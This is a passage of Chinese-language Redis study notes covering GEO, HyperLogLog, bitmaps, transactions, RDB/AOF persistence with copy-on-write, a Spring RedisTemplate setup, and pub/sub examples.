<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; GEOPOS china:city xian</span><br><span class="line"><span class="number">1</span>) <span class="number">1</span>) &quot;<span class="number">108</span>.<span class="number">96000176668167114</span>&quot;</span><br><span class="line">   <span class="number">2</span>) &quot;<span class="number">34</span>.<span class="number">25999964418929977</span>&quot;</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; GEOPOS china:city bejing</span><br><span class="line"><span class="number">1</span>) (nil)</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; GEOPOS china:city beijing</span><br><span class="line"><span class="number">1</span>) <span class="number">1</span>) &quot;<span class="number">116</span>.<span class="number">39999896287918091</span>&quot;</span><br><span class="line">   <span class="number">2</span>) &quot;<span class="number">39</span>.<span class="number">90000009167092543</span>&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>GEODIST 两人之间的距离！</p>
<p>单位：</p>
<p><strong>m</strong> 表示单位为米。</p>
<p><strong>km</strong> 表示单位为千米。</p>
<p><strong>mi</strong> 表示单位为英里。</p>
<p><strong>ft</strong> 表示单位为英尺。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; GEODIST china:city beijing shanghai km</span><br><span class="line">&quot;<span class="number">1067</span>.<span class="number">3788</span>&quot;</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; GEODIST china:city beijing xian km</span><br><span class="line">&quot;<span class="number">910</span>.<span class="number">0565</span>&quot;</span><br></pre></td></tr></table></figure>

<h2 id="Hyperloglog"><a href="#Hyperloglog" class="headerlink" title="Hyperloglog"></a><strong>Hyperloglog</strong></h2><p>什么是基数？</p>
<p>A {1,3,5,7,8,7}</p>
<p>B{1，3,5,7,8}</p>
<p>基数（不重复的元素） &#x3D; 5，可以接受误差！</p>
<p>简介</p>
<p>Redis 2.8.9 版本就更新了 Hyperloglog 数据结构！</p>
<p>Redis Hyperloglog 基数统计的算法！</p>
<p>优点：占用的内存是固定，2^64 不同的元素的技术，只需要废 12KB内存！如果从内存角度来比较的话 Hyperloglog 首选！</p>
<p><strong>网页的</strong> <strong>UV</strong> <strong>（一个人访问一个网站多次，但是还是算作一个人！）</strong></p>
<p>传统的方式， set 保存用户的id，然后就可以统计 set 中的元素数量作为标准判断 !</p>
<p>这个方式如果保存大量的用户id，就会比较麻烦！我们的目的是为了计数，而不是保存用户id；</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; PFadd mykey a b c d e f g h i j # 创建第一组元素 mykey </span><br><span class="line">(integer) <span class="number">1</span> </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; PFCOUNT mykey # 统计 mykey 元素的基数数量 </span><br><span class="line">(integer) <span class="number">10</span> </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; PFadd mykey2 i j z x c v b n m # 创建第二组元素 mykey2 </span><br><span class="line">(integer) <span class="number">1</span> </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; PFCOUNT mykey2 </span><br><span class="line">(integer) <span class="number">9</span> </span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; PFMERGE mykey3 mykey mykey2 # 合并两组 mykey mykey2 =&gt; mykey3 并集 </span><br><span class="line">OK</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; PFCOUNT mykey3 # 看并集的数量！ </span><br><span class="line">(integer) <span class="number">15</span></span><br></pre></td></tr></table></figure>

<p>0.81% 错误率！ 统计UV任务，可以忽略不计的！</p>
<h2 id="Bitmap"><a href="#Bitmap" class="headerlink" title="Bitmap"></a><strong>Bitmap</strong></h2><p>位存储</p>
<p>统计用户信息，活跃，不活跃！ 登录 、 未登录！ 打卡，365打卡！ 两个状态的，都可以使用</p>
<p>Bitmaps！</p>
<p>Bitmap 位图，数据结构！ 都是操作二进制位来进行记录，就只有0 和 1 两个状态！</p>
<p>365 天 &#x3D; 365 bit 1字节 &#x3D; 8bit 46 个字节左右！</p>
<p>例如使用bitmao来记录周一到周日的打卡</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; SETBIT sign <span class="number">0</span> <span class="number">1</span></span><br><span class="line">(integer) <span class="number">0</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; SETBIT sign <span class="number">1</span> <span class="number">0</span></span><br><span class="line">(integer) <span class="number">0</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; SETBIT sign <span class="number">2</span> <span class="number">0</span></span><br><span class="line">(integer) <span class="number">0</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; SETBIT sign <span class="number">3</span> <span class="number">0</span></span><br><span class="line">(integer) <span class="number">0</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; SETBIT sign <span class="number">4</span> <span class="number">0</span></span><br><span class="line">(integer) <span class="number">0</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; SETBIT sign <span class="number">5</span> <span class="number">0</span></span><br><span class="line">(integer) <span class="number">0</span></span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; SETBIT sign <span class="number">6</span> <span class="number">1</span></span><br><span class="line">(integer) <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>查看某一天是否有打卡</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; GETBIT sign <span class="number">6</span></span><br><span class="line">(integer) <span class="number">1</span></span><br><span class="line"># 统计打卡</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; BITCOUNT sign</span><br><span class="line">(integer) <span class="number">2</span></span><br></pre></td></tr></table></figure>



<h1 id="事务"><a href="#事务" class="headerlink" title="事务"></a>事务</h1><p>Redis 事务本质：一组命令的集合！ 一个事务中的所有命令都会被序列化，在事务执行过程的中，会按照顺序执行！</p>
<p>一次性、顺序性、排他性！执行一些列的命令！</p>
<p>redis事务：</p>
<ul>
<li>开启事务</li>
<li>命令入队</li>
<li>执行事务</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>&gt; MULTI # 开启事务</span><br><span class="line">OK</span><br><span class="line"># 任务入队</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>(TX)&gt; <span class="built_in">set</span> liduoan v1</span><br><span class="line">QUEUED</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>(TX)&gt; <span class="built_in">set</span> liduoan2 v2</span><br><span class="line">QUEUED</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>(TX)&gt; get liduoan</span><br><span class="line">QUEUED</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>(TX)&gt; <span class="built_in">set</span> liduoan3 v3</span><br><span class="line">QUEUED</span><br><span class="line"><span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">6379</span>(TX)&gt; exec  # 执行事务</span><br><span class="line"><span class="number">1</span>) OK</span><br><span class="line"><span class="number">2</span>) OK</span><br><span class="line"><span class="number">3</span>) &quot;v1&quot;</span><br><span class="line"><span class="number">4</span>) OK</span><br></pre></td></tr></table></figure>

<p>这里的事务 运行时异常是不会被中断回滚</p>
<p>官网文档上有这样一段话：</p>
<blockquote>
<p>A Redis script is transactional by definition, so everything you can do with a Redis transaction, you can also do with a script and usually the script will be both simpler and faster.</p>
<p>官方推荐使用Lua脚本代替原生事务操作。</p>
</blockquote>
<h2 id="Lua脚本"><a href="#Lua脚本" class="headerlink" title="Lua脚本"></a>Lua脚本</h2><p>Redis在2.6推出了脚本功能，允许开发者使用Lua语言编写脚本传到Redis中执行。使用脚本的好处如下:</p>
<p>1、<strong>减少网络开销</strong>：本来5次网络请求的操作，可以用一个请求完成，原先5次请求的逻辑放在redis服务器上完成。使用脚本，减少了网络往返时延。这点跟管道类似。</p>
<p>2、<strong>原子操作</strong>：Redis会将整个脚本作为一个整体执行，中间不会被其他命令插入。管道不是原子的，不过redis的批量操作命令(类似<code>mset</code>)是原子的。</p>
<p>3、<strong>替代redis的事务功能</strong>：redis自带的事务功能很鸡肋，报错不支持回滚，而redis的lua脚本几乎实现了常规的事务功能，支持报错回滚操作，官方推荐如果要使用redis的事务功能可以用redis lua替代。</p>
<h2 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h2><p><code>Watch</code></p>
<p>悲观锁：</p>
<p>和多线程中的解释类似，认为什么时候都会出现问题，无论做什么都会加锁</p>
<p>乐观锁：</p>
<p>很乐观，认为不会出现问题，所以不会上锁。</p>
<p>类似CAS，Compare And Swap</p>
<p>Watch 和 UNWatch需要同时做好</p>
<h1 id="Redis持久化"><a href="#Redis持久化" class="headerlink" title="Redis持久化"></a>Redis持久化</h1><h2 id="RDB"><a href="#RDB" class="headerlink" title="RDB"></a>RDB</h2><p><strong>RDB快照</strong>是Redis最早的持久化方式。在默认情况下，Redis<strong>将内存数据快照</strong>保存在名字为<code>dump.rdb</code>的二进制文件中，也就是说，Redis会将内存中的所有信息拷贝至rdb文件中。</p>
<p>你可以对Redis进行设置， 让它在<strong>N 秒内数据集至少有 M 个改动</strong>这一条件被满足时， 自动保存一次数据集。Redis的配置文<code>redis.config</code>中默认对RDB的配置如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">save 900 1 <span class="comment"># 900秒内有至少有1个键被改动</span></span><br><span class="line">save 300 10 <span class="comment"># 300秒内有至少有10个键被改动</span></span><br><span class="line">save 60 10000 <span class="comment"># 60秒内有至少有10000个键被改动</span></span><br><span class="line">dbfilename  dump.rdb <span class="comment"># rdb文件名</span></span><br><span class="line"><span class="built_in">dir</span>  ./ <span class="comment"># rdb文件存储路径</span></span><br></pre></td></tr></table></figure>

<p>以上设置会让Redis在满足这些条件时， 自动保存一次数据集。 如果需要关闭RDB，<strong>只需要将所有的save保存策略注释掉即可</strong>。还可以手动执行命令生成RDB快照，进入redis客户端执行命令<code>save</code>或<code>bgsave</code>可以手动生成<code>dump.rdb</code>文件，每次命令执行都会将所有Redis内存快照到一个新的rdb文件里，并覆盖原有rdb快照文件。</p>
<p><code>save</code>是<strong>同步</strong>IO方式，向rdb文件写信息时会阻塞其它请求。而<code>bgsave</code>和<code>save</code>命令相比，采取了<strong>异步</strong>IO方式，生成额外的子进程将内存数据写入rdb文件中，不会阻塞客户端的其它请求。</p>
<p><code>bgsave</code>方式借助了操作系统提供的<strong>写时复制技术（Copy-On-Write, COW）</strong>，在生成快照的同时，依然可以正常处理客户端的其它写命令。简单来说，<code>bgsave</code>子进程是由主线程<code>fork</code>生成的，可以共享主线程的所有内存数据。 <code>bgsave</code>子进程运行后，开始读取主线程的内存数据，并把它们写入rdb文件。此时，如果主线程对这些数据也都是读操作，那么，主线程和子进程相互不影响。<strong>但是，如果主线程要修改一块数据，那么，这块数据就会被复制一份，生成该数据的副本</strong>。然后，<code>bgsave</code>子进程会把这个副本数据也写入rdb文件，而在这个过程中，主线程仍然可以直接修改原来的数据。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>save</th>
<th>bgsave</th>
</tr>
</thead>
<tbody><tr>
<td>IO类型</td>
<td>同步</td>
<td>异步</td>
</tr>
<tr>
<td>是否阻塞redis其它命令</td>
<td>是</td>
<td>否(在生成子进程执行调用fork函数时会有短暂阻塞)</td>
</tr>
<tr>
<td>优点</td>
<td>不会消耗额外内存</td>
<td>不阻塞客户端命令</td>
</tr>
<tr>
<td>缺点</td>
<td>阻塞客户端命令</td>
<td>需要fork子进程，消耗内存</td>
</tr>
</tbody></table>
<p>Redis配置自动生成rdb文件后台使用的是<code>bgsave</code>方式。</p>
<h2 id="写时复制"><a href="#写时复制" class="headerlink" title="写时复制"></a>写时复制</h2><p>关于写时复制的原理需要了解清楚</p>
<p>传统的操作系统，fork一个进场后，会<strong>直接</strong>将父进程的数据拷贝到子进程中，拷贝完之后，父进程和子进程之间的数据段和堆栈是<strong>相互独立的</strong>。</p>
<p>而很多时候复制给子进程的数据是无效的，大都时候子进程会使用自己的方法。</p>
<p>那么写时复制是指什么呢？</p>
<blockquote>
<p>fork创建出的子进程，与父进程共享内存空间。也就是说，如果子进程不对内存空间进行写入操作的话，内存空间中的数据并不会复制给子进程，这样创建子进程的速度就很快了！(不用复制，直接引用父进程的物理空间)。<br>并且如果在fork函数返回之后，子进程第一时间exec一个新的可执行映像，那么也不会浪费时间和内存空间了。</p>
</blockquote>
<p>在fork之后exec之前两个进程用的是相同的物理空间（内存区），子进程的代码段、数据段、堆栈都是指向父进程的物理空间，也就是说，两者的虚拟空间不同，但其对应的物理空间是同一个。</p>
<p>当父子进程中有更改相应段的行为发生时，再为子进程相应的段分配物理空间。</p>
<p>如果不是因为exec，内核会给子进程的数据段、堆栈段分配相应的物理空间（至此两者有各自的进程空间，互不影响），而代码段继续共享父进程的物理空间（两者的代码完全相同）。</p>
<p>而如果是因为exec，由于两者执行的代码不同，子进程的代码段也会分配单独的物理空间。</p>
<p><strong>Copy On Write技术实现原理：</strong></p>
<p>fork()之后，kernel把父进程中所有的内存页的权限都设为read-only，然后子进程的地址空间指向父进程。当父子进程都只读内存时，相安无事。当其中某个进程写内存时，CPU硬件检测到内存页是read-only的，于是触发页异常中断（page-fault），陷入kernel的一个中断例程。中断例程中，kernel就会把触发的异常的页复制一份，于是父子进程各自持有独立的一份。</p>
<p>Copy On Write技术好处是什么？</p>
<p>COW技术可减少分配和复制大量资源时带来的瞬间延时。<br>COW技术可减少不必要的资源分配。比如fork进程时，并不是所有的页面都需要复制，父进程的代码段和只读数据段都不被允许修改，所以无需复制。<br>Copy On Write技术缺点是什么？</p>
<p>如果在fork()之后，父子进程都还需要继续进行写操作，那么会产生大量的分页错误(页异常中断page-fault)，这样就得不偿失。<br>几句话总结Linux的Copy On Write技术：</p>
<p>fork出的子进程共享父进程的物理空间，当父子进程有内存写入操作时，read-only内存页发生中断，将触发的异常的内存页复制一份(其余的页还是共享父进程的)。<br>fork出的子进程功能实现和父进程是一样的。如果有需要，我们会用exec()把当前进程映像替换成新的进程文件，完成自己想要实现的功能。</p>
<ul>
<li>原文链接：<a class="link"   href="https://blog.csdn.net/qq_32131499/article/details/94561780" >https://blog.csdn.net/qq_32131499/article/details/94561780<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h2 id="AOF"><a href="#AOF" class="headerlink" title="AOF"></a>AOF</h2><p>快照功能并不是非常耐久，因为如果Redis因为某些原因而造成故障停机， 并且还没有满足RDB写文件的条件，那么服务器将丢失最近写入、且仍未保存到快照中的那些数据。从 1.1 版本开始， Redis 增加了一种完全耐久的持久化方式： <em>*AOF（append-only file） **持久化，将**修改的每一条指令</em>*记录进文件<code>appendonly.aof</code>中(先写入os cache，每隔一段时间fsync到磁盘) 。</p>
<p>AOF功能默认是关闭的，如要打开需要修改配置文件中的如下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Bash</span><br><span class="line">appendonly <span class="built_in">yes</span> <span class="comment"># 打开AOF</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># AOF多久才将数据 fsync 到磁盘一次，有三种方式：</span></span><br><span class="line">appendfsync always <span class="comment"># 每次有新命令追加到 AOF 文件时就执行一次 fsync 慢但是非常安全 </span></span><br><span class="line">appendfsync everysec <span class="comment"># 每秒 fsync 一次，足够快，并且在故障时只最多会丢失 1 秒钟的数据（推荐）</span></span><br><span class="line">appendfsync no <span class="comment"># 从不 fsync ，将数据交给操作系统来处理，更快但是不安全</span></span><br></pre></td></tr></table></figure>

<p>比如我们执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> jimmy 123 ex 1000</span><br></pre></td></tr></table></figure>

<p>那么该指令在AOF文件中的内容如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Tex</span><br><span class="line">*3 </span><br><span class="line"><span class="variable">$3</span> </span><br><span class="line"><span class="built_in">set</span></span><br><span class="line"><span class="variable">$5</span></span><br><span class="line">jimmy</span><br><span class="line"><span class="variable">$3</span> </span><br><span class="line">888 </span><br><span class="line">*3 </span><br><span class="line"><span class="variable">$9</span> </span><br><span class="line">PEXPIREAT </span><br><span class="line"><span class="variable">$5</span></span><br><span class="line">jimmy</span><br><span class="line"><span class="variable">$13</span> </span><br><span class="line">1604249998764</span><br></pre></td></tr></table></figure>

<p>这是一种resp协议格式数据，<code>*</code>后面的数字代表命令有多少个参数，<code>$</code>号后面的数字代表这个参数有几个字符。如果执行带过期时间的<code>set</code>命令，AOF文件里记录的是并不是执行的原始命令，而是记录key过期的时间戳。</p>
<ul>
<li><strong>AOF重写</strong></li>
</ul>
<p>AOF文件里可能有太多没用的指令，所以AOF会定期根据内存的最新数据生成AOF文件。比如说对某个值进行了多次<code>INCR</code>加1操作，那么会将这些<code>INCR</code>操作直接替换成一个<code>SET</code>操作，可以压缩AOF文件的大小并且加快数据恢复速度。配置文件中如下两个配置可以控制AOF自动重写频率：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># AOF文件至少要达到64M才会自动重写，文件太小恢复速度本来就很快，重写的意义不大</span></span><br><span class="line">auto‐AOF‐rewrite‐min‐size 64mb  </span><br><span class="line"></span><br><span class="line"><span class="comment"># AOF文件自上一次重写后文件大小增长了100%则再次触发重写</span></span><br><span class="line">auto‐AOF‐rewrite‐percentage 100</span><br></pre></td></tr></table></figure>

<p>当然AOF也可以手动重写，进入redis客户端执行命令<code>bgrewriteAOF</code>重写AOF。<strong>AOF重写时，Redis会fork出一个子进程去做(与<code>bgsave</code>命令类似)，不会对Redis的其它命令处理有太多影响。</strong></p>
<h2 id="AOP与RDB比较"><a href="#AOP与RDB比较" class="headerlink" title="AOP与RDB比较"></a>AOP与RDB比较</h2><table>
<thead>
<tr>
<th>方式</th>
<th>RDB</th>
<th>AOP</th>
</tr>
</thead>
<tbody><tr>
<td>启动优先级</td>
<td>低</td>
<td>高</td>
</tr>
<tr>
<td>文件中存储的内容</td>
<td>内存数据的快照</td>
<td>执行的修改指令</td>
</tr>
<tr>
<td>体积</td>
<td>小</td>
<td>大</td>
</tr>
<tr>
<td>恢复速度</td>
<td>快</td>
<td>慢</td>
</tr>
<tr>
<td>数据安全性</td>
<td>容易丢数据</td>
<td>根据策略决定</td>
</tr>
</tbody></table>
<p>这两种方式生产环境可以都启用，Redis启动时如果既有rdb文件又有AOF文件，<strong>则优先选择AOF文件恢复数据</strong>，因为AOF一般来说数据更全一点。</p>
<h2 id="Redis4-0混合持久化"><a href="#Redis4-0混合持久化" class="headerlink" title="Redis4.0混合持久化"></a>Redis4.0混合持久化</h2><p>重启Redis时，我们很少使用 RDB来恢复内存状态，因为可能会丢失大量数据。我们通常使用AOF日志进行恢复，但是通过AOF日志恢复的性能相对RDB来说要慢很多，这样在Redis实例很大的情况下，启动需要花费很长的时间。 Redis4.0为了解决这个问题，带来了一个新的持久化选项——<strong>混合持久化</strong>。</p>
<p>通过如下配置可以开启混合持久化(<strong>必须先开启AOF</strong>)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AOF‐use‐rdb‐preamble <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<p>如果开启了混合持久化，AOF写文件时，不再是单纯将内存数据转换为RESP指令写入AOF文件，而是将重写这一刻之前的内存做RDB快照处理，并且将RDB快照内容写入AOF文件。如果在写AOF文件的时候还要有它指令正在执行，那么会将这些指令以RESP指令的结果存储在AOF文件中。<strong>简单来说，混合持久化方式下，AOF文件中的内容为：RDB快照 + 增量AOF。</strong>新的文件一开始不叫<code>appendonly.aof</code>，等到重写完新的AOF文件才会进行改名，覆盖原有的AOF文件，完成新旧两个AOF文件的替换。于是在 Redis 重启的时候，可以先加载RDB的内容，然后再恢复增量AOF ，就可以完全替代之前的AOF全量文件的恢复，因此重启效率大幅得到提升。</p>
<blockquote>
<p>Redis的数据恢复是自动的，只要将日志文件放在配置文件中指定的路径下，重启Redis后会根据AOF或者RDB文件自动恢复数据。</p>
</blockquote>
<h2 id="Redis数据备份策略"><a href="#Redis数据备份策略" class="headerlink" title="Redis数据备份策略"></a>Redis数据备份策略</h2><ul>
<li>写crontab定时调度脚本（Linux中通过<code>crontab -e</code>命令编辑）。可以每小时都copy一份RDB或AOF的备份到一个目录中去，仅仅保留最近48小时的备份。</li>
<li>每天都保留一份当日的数据备份到一个目录中去，可以保留最近1个月的备份。</li>
<li>每次备份的时候，都把太旧的备份给删了。</li>
<li>每天晚上将当前机器上的备份复制一份到其他机器上，以防机器损坏。</li>
</ul>
<hr>
<h1 id="RedisTemplate"><a href="#RedisTemplate" class="headerlink" title="RedisTemplate"></a>RedisTemplate</h1><p>一般在企业级开发中，会对原生的Template进行更改升级，而不是直接使用原生的springboot的redis进行操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"> <span class="keyword">public</span> RedisTemplate <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory redisConnectionFactory)</span> &#123;</span><br><span class="line">     RedisTemplate&lt;Object, Object&gt; template = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>();</span><br><span class="line">     template.setConnectionFactory(redisConnectionFactory);</span><br><span class="line"></span><br><span class="line">     <span class="type">Jackson2JsonRedisSerializer</span> <span class="variable">jackson2JsonRedisSerializer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Jackson2JsonRedisSerializer</span>(Object.class);</span><br><span class="line">     jackson2JsonRedisSerializer.setObjectMapper(<span class="keyword">new</span> <span class="title class_">ObjectMapper</span>());</span><br><span class="line">     <span class="comment">//redis的键进行序列化 是String</span></span><br><span class="line">     template.setKeySerializer(<span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>());</span><br><span class="line">     <span class="comment">//对值进行序列化</span></span><br><span class="line">     template.setValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">     <span class="comment">//对模板的Hash键进行序列化</span></span><br><span class="line">     template.setHashKeySerializer(<span class="keyword">new</span> <span class="title class_">StringRedisSerializer</span>());</span><br><span class="line">     <span class="comment">//对模板的值进行序列化</span></span><br><span class="line">     template.setHashValueSerializer(jackson2JsonRedisSerializer);</span><br><span class="line">     <span class="comment">//返回模板</span></span><br><span class="line">     <span class="keyword">return</span> template;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后我们会使用对应的RedisUtil进行封装处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisUtil</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> RedisTemplate redisTemplate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Redis-conf详解"><a href="#Redis-conf详解" class="headerlink" title="Redis.conf详解"></a>Redis.conf详解</h1><h1 id="发布订阅"><a href="#发布订阅" class="headerlink" title="发布订阅"></a>发布订阅</h1><p>Redis 发布订阅(pub&#x2F;sub)是一种消息通信模式：发送者(pub)发送消息，订阅者(sub)接收消息。微信、微博、关注系统！</p>
<p>Redis 客户端可以订阅任意数量的频道。</p>
<p>订阅&#x2F;发布消息图：</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://i.loli.net/2021/03/18/ZpPv93LtCVBrNRo.jpg"
                      alt="Screenshot_1.jpg"
                ></p>
<p>第一个：消息发送者， 第二个：频道 第三个：消息订阅者！</p>
<h2 id="Redis-发布订阅命令"><a href="#Redis-发布订阅命令" class="headerlink" title="Redis 发布订阅命令"></a>Redis 发布订阅命令</h2><p>下表列出了 redis 发布订阅常用命令：</p>
<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">命令及描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left">[PSUBSCRIBE pattern <a class="link"   href="https://www.runoob.com/redis/pub-sub-psubscribe.html" >pattern …]<i class="fas fa-external-link-alt"></i></a> 订阅一个或多个符合给定模式的频道。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">[PUBSUB subcommand <a class="link"   href="https://www.runoob.com/redis/pub-sub-pubsub.html" >argument [argument …]]<i class="fas fa-external-link-alt"></i></a> 查看订阅与发布系统状态。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><a class="link"   href="https://www.runoob.com/redis/pub-sub-publish.html" >PUBLISH channel message<i class="fas fa-external-link-alt"></i></a> 将信息发送到指定的频道。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">[PUNSUBSCRIBE <a class="link"   href="https://www.runoob.com/redis/pub-sub-punsubscribe.html" >pattern [pattern …]]<i class="fas fa-external-link-alt"></i></a> 退订所有给定模式的频道。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">[SUBSCRIBE channel <a class="link"   href="https://www.runoob.com/redis/pub-sub-subscribe.html" >channel …]<i class="fas fa-external-link-alt"></i></a> 订阅给定的一个或多个频道的信息。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">[UNSUBSCRIBE <a class="link"   href="https://www.runoob.com/redis/pub-sub-unsubscribe.html" >channel [channel …]]<i class="fas fa-external-link-alt"></i></a> 指退订给定的频道。</td>
</tr>
</tbody></table>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以下实例演示了发布订阅是如何工作的，需要开启两个 redis-cli 客户端。</p>
<p>在我们实例中我们创建了订阅频道名为 <strong>runoobChat</strong>:</p>
<h3 id="第一个-redis-cli-客户端"><a href="#第一个-redis-cli-客户端" class="headerlink" title="第一个 redis-cli 客户端"></a>第一个 redis-cli 客户端</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis 127.0.0.1:6379**&gt;** SUBSCRIBE runoobChat</span><br><span class="line"></span><br><span class="line">Reading messages... **(**press Ctrl-C to quit**)**</span><br><span class="line">1**)** <span class="string">&quot;subscribe&quot;</span></span><br><span class="line">2**)** <span class="string">&quot;redisChat&quot;</span></span><br><span class="line">3**)** **(**<span class="built_in">integer</span>**)** 1</span><br></pre></td></tr></table></figure>



<p>现在，我们先重新开启个 redis 客户端，然后在同一个频道 runoobChat 发布两次消息，订阅者就能接收到消息。</p>
<h3 id="第二个-redis-cli-客户端"><a href="#第二个-redis-cli-客户端" class="headerlink" title="第二个 redis-cli 客户端"></a>第二个 redis-cli 客户端</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis 127.0.0.1:6379&gt; PUBLISH runoobChat <span class="string">&quot;Redis PUBLISH test&quot;</span></span><br><span class="line"></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line"></span><br><span class="line">redis 127.0.0.1:6379&gt; PUBLISH runoobChat <span class="string">&quot;Learn redis by runoob.com&quot;</span></span><br><span class="line"></span><br><span class="line">(<span class="built_in">integer</span>) 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 订阅者的客户端会显示如下消息</span></span><br><span class="line"> 1) <span class="string">&quot;message&quot;</span></span><br><span class="line"> 2) <span class="string">&quot;runoobChat&quot;</span></span><br><span class="line"> 3) <span class="string">&quot;Redis PUBLISH test&quot;</span></span><br><span class="line"> 1) <span class="string">&quot;message&quot;</span></span><br><span class="line"> 2) <span class="string">&quot;runoobChat&quot;</span></span><br><span class="line"> 3) <span class="string">&quot;Learn redis by runoob.com&quot;</span></span><br></pre></td></tr></table></figure>



<p>gif 演示如下：</p>
<ul>
<li>开启本地 Redis 服务，开启两个 redis-cli 客户端。</li>
<li>在<strong>第一个 redis-cli 客户端</strong>输入 <strong>SUBSCRIBE runoobChat</strong>，意思是订阅 <code>runoobChat</code> 频道。</li>
